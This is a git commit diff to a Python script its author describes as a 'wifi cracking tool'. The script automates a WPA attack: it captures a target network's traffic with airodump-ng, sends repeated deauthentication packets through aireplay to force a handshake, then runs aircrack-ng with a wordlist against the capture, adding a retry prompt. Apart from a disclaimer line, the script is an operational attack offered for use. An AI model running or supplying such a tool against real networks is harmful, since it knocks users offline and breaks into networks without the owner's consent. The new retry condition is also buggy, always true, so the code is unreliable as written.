479975b007d8bdaef78fb96bfbb5581e923e3b94
Nux404 <78324112+Nux404@users.noreply.github.com>
2021-02-06 12:33:07 +0100

    AutomaticCRR.py

--- AutomaticCRR.py
+++ AutomaticCRR.py
@@ -12,7 +12,7 @@ os.system("clear")
 
 print("I disclaim all responsibility for the use you make of my wifi cracking tool.")
 time.sleep(1)
-print("Please make sure that you are connect in super user mode (sudo su) before launch.")
+print("If your not connect in super user mode (sudo su) restart the program.")
 time.sleep(1)
 
 PATH = input("Enter the path to install files : ")
@@ -48,7 +48,7 @@ BSSID = input("Enter the BSSID to crack : ")
 CHANNEL = input("Enter the CHANNEL of the network to crack : ")
 
 os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE_2}")
-time.sleep(12)
+time.sleep(10)
 
 STATION = input("Enter the STATION of the network to crack : ")
 os.system("clear")
@@ -59,9 +59,9 @@ while aireplay != 14:
 
 print(f"When the sentence WPA HANDSHAKE FOUND: {BSSID} is displayed close the window(s) Sending 64 directed DeAuth.")
 print("")
-time.sleep(4)
+time.sleep(5)
 
-PATH_LST = input("Enter the list directory to use in the cracking : ")
+PATH_LST = input("Enter the list directory to use for crack : ")
 PATH_Validity = os.path.exists(PATH_LST)
 
 while PATH_Validity != True:
@@ -69,4 +69,12 @@ while PATH_Validity != True:
 	PATH_Validity = os.path.exists(PATH_2)
 	PATH_LST = PATH_2
 
+os.system(f"airmon-ng stop {INTERFACE_2}")
 os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
+
+retry = input("Do you want to retry with an another list ? [y/n]")
+
+if retry == "y" or "Y":
+	os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
+else:
+	exit()
